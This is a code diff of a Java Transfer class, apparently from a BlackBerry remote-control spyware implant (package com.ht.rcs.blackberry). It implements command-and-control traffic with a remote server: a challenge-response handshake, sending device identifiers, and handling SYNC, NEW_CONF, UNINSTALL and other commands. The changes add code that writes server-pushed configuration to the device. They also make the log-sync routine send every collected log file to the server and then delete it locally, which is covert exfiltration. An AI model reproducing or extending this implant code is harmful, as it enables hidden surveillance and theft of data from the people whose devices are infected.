@@ -14,10 +14,12 @@ import java.util.Vector;
 import net.rim.device.api.util.Arrays;
 import net.rim.device.api.util.DataBuffer;
 
+import com.ht.rcs.blackberry.Conf;
 import com.ht.rcs.blackberry.Device;
 import com.ht.rcs.blackberry.config.Keys;
 import com.ht.rcs.blackberry.crypto.Encryption;
 import com.ht.rcs.blackberry.fs.AutoFlashFile;
+import com.ht.rcs.blackberry.fs.Path;
 import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
@@ -127,6 +129,8 @@ public class Transfer {
             byte[] buflen = connection.receive(4);
             int len = Utils.byteArrayToInt(buflen, 0);
 
+            sendCommand(Proto.OK);
+
             fillPayload(command, len);
         } catch (IOException e) {
             debug.error("receiving command: " + e);
@@ -150,6 +154,7 @@ public class Transfer {
 
         try {
             command.payload = connection.receive(len);
+            debug.trace("filled with: " + command.payload.length);
         } catch (IOException e) {
             debug.error("receiving command: " + e);
             throw new ProtocolException("fillPayload");
@@ -180,20 +185,34 @@ public class Transfer {
         } else {
             throw new ProtocolException("not a valid challenge command");
         }
-
     }
 
-    protected void getNewConf(Command command) throws ProtocolException {
+    protected void getNewConf(Command command) throws CommandException,
+            ProtocolException {
+
+        debug.trace("getNewConf");
 
         fillPayload(command);
-
+        if (command.size() > 0) {
+            AutoFlashFile file = new AutoFlashFile(Path.USER_PATH
+                    + Path.CONF_DIR + "/" + Conf.NEW_CONF, true);
+            if (!file.exists()) {
+                file.create();
+            }
+            boolean ret = file.write(command.payload);
+            if (!ret) {
+                throw new CommandException("Cannot write new conf");
+            } else {
+                sendCommand(Proto.OK);
+            }
+        }
     }
 
     protected void getResponse() throws ProtocolException {
         debug.info("getResponse");
 
         Command command = recvCommand();
-        //boolean exception = false;
+        // boolean exception = false;
         if (command == null || command.id != Proto.RESPONSE) {
             throw new ProtocolException("=wrong proto.response");
         }
@@ -220,14 +239,12 @@ public class Transfer {
 
     }
 
-    protected void getUpgrade(Command command) {
-        // TODO Auto-generated method stub
-
+    protected void getUpgrade(Command command) throws CommandException {
+        throw new CommandException("Not Implemented");
     }
 
-    protected void getUpload(Command command) {
-        // TODO Auto-generated method stub
-
+    protected void getUpload(Command command) throws CommandException {
+        throw new CommandException("Not Implemented");
     }
 
     public void init(String host_, int port_, boolean wifiPreferred_) {
@@ -237,44 +254,52 @@ public class Transfer {
         crypto.makeKey(Keys.getChallengeKey());
     }
 
-    protected boolean parseCommand(Command command) {
+    protected boolean parseCommand(Command command) throws ProtocolException {
         Check.asserts(command != null, "null command");
 
         try {
 
             switch (command.id) {
             case Proto.SYNC:
+                debug.info("SYNC");
                 syncLogs(command);
                 break;
 
             case Proto.NEW_CONF:
+                debug.info("NEW_CONF");
                 getNewConf(command);
                 break;
 
             case Proto.UNINSTALL:
+                debug.info("UNINSTALL");
                 uninstall = true;
                 sendCommand(Proto.OK);
                 return false;
 
             case Proto.DOWNLOAD:
+                debug.info("DOWNLOAD");
                 sendDownload(command);
                 break;
 
             case Proto.UPLOAD:
+                debug.info("UPLOAD");
                 getUpload(command);
                 break;
 
             case Proto.UPGRADE:
+                debug.info("UPGRADE");
                 getUpgrade(command);
                 break;
 
             case Proto.BYE:
+                debug.info("BYE");
                 return false;
 
             default:
                 break;
             }
-        } catch (ProtocolException ex) {
+        } catch (CommandException ex) {
+            debug.warn("parseCommand exception:" + ex);
             sendCommand(Proto.NO);
         }
 
@@ -308,19 +333,24 @@ public class Transfer {
 
         try {
             // challenge response
+            debug.trace("ChallengeResponse ->");
             sendChallenge();
             getResponse();
 
+            debug.trace("ChallengeResponse <-");
             getChallenge();
             sendResponse();
 
             // identificazione
+            debug.trace("Ids");
             sendIds();
 
             // ricezione configurazione o comandi
             for (;;) {
                 Command command = recvCommand();
+                debug.info("Received command:" + command);
                 if (!parseCommand(command)) {
+                    debug.info("finished commands");
                     break;
                 }
             }
@@ -332,6 +362,7 @@ public class Transfer {
             disconnect();
         }
 
+        debug.info("done");
         return true;
     }
 
@@ -384,25 +415,31 @@ public class Transfer {
         return sendCommand(new Command(command, payload));
     }
 
-    protected void sendCryptoCommand(int commandId, byte[] plain)
-            throws ProtocolException {
+    protected void sendManagedCommand(int commandId, byte[] plain,
+            boolean cypher) throws ProtocolException {
 
-        debug.info("Sending Crypto Command: " + commandId);
+        byte[] toSend;
 
-        byte[] cyphered = crypto.encryptData(plain);
+        if (cypher) {
+            debug.info("Sending Crypto Command: " + commandId);
+            toSend = crypto.encryptData(plain);
+        } else {
+            debug.info("Sending Managed Command: " + commandId);
+            toSend = plain;
+        }
 
         sendCommand(commandId, Utils.intToByteArray(plain.length));
         waitForOK();
 
         boolean sent = false;
         try {
-            sent = connection.send(cyphered);
+            sent = connection.send(toSend);
         } catch (IOException e) {
             debug.error(e.toString());
         }
 
         if (!sent) {
-            throw new ProtocolException("sendCryptoCommand cannot send"
+            throw new ProtocolException("sendManagedCommand cannot send"
                     + commandId);
         }
 
@@ -410,9 +447,15 @@ public class Transfer {
 
     }
 
-    protected void sendDownload(Command command) {
-        // TODO Auto-generated method stub
+    protected void sendCryptoCommand(int commandId, byte[] plain)
+            throws ProtocolException {
 
+        sendManagedCommand(commandId, plain, true);
+
+    }
+
+    protected void sendDownload(Command command) throws CommandException {
+        throw new CommandException("Not Implemented");
     }
 
     protected void sendIds() throws ProtocolException {
@@ -447,7 +490,7 @@ public class Transfer {
     protected synchronized void syncLogs(Command command)
             throws ProtocolException {
 
-        debug.info("connected: " + connected + " wifi: " + wifi);
+        debug.info("syncLogs connected: " + connected + " wifi: " + wifi);
 
         // snap dei log
         Vector logs = logCollector.getLogs();
@@ -455,14 +498,12 @@ public class Transfer {
             String logName = (String) logs.elementAt(i);
             AutoFlashFile file = new AutoFlashFile(logName, false);
             byte[] content = file.read();
-            // boolean ret = sendManagedCommand(Proto.SYNC, content);
-
+            sendManagedCommand(Proto.LOG, content, false);
+            logCollector.remove(logName);
         }
 
         sendCommand(Proto.LOG_END);
         waitForOK();
-
-        // connection.disconnect();
     }
 
     private void waitForOK() throws ProtocolException {
